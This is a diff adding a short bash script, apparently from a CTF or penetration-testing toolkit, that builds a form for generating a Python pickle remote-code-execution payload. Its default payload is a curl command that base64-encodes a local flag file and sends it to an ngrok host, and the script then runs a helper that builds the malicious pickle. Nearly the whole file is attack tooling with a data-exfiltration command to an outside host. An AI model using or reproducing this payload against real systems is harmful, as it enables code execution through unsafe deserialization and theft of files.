@@ -1,0 +1,16 @@
+#!/bin/bash
+
+: '
+python3: create pickle RCE with os.system
+'
+
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+PAYLOAD_FIELD=$(form_item  "payload" "payload" 'curl https://52b8-62-45-36-91.ngrok-free.app/`cat ./flag_DkPQGH.txt | base64 -w 0`')
+
+# Generate GUI form
+generate_form "${PAYLOAD_FIELD}"
+
+PAYLOAD=${form_data["payload"]}
+
+execute_command "python3 ${SCRIPTS_DIR}/python/.files/pythonPickleRceOsSystem.py --payload ${PAYLOAD}"
+create_new_line
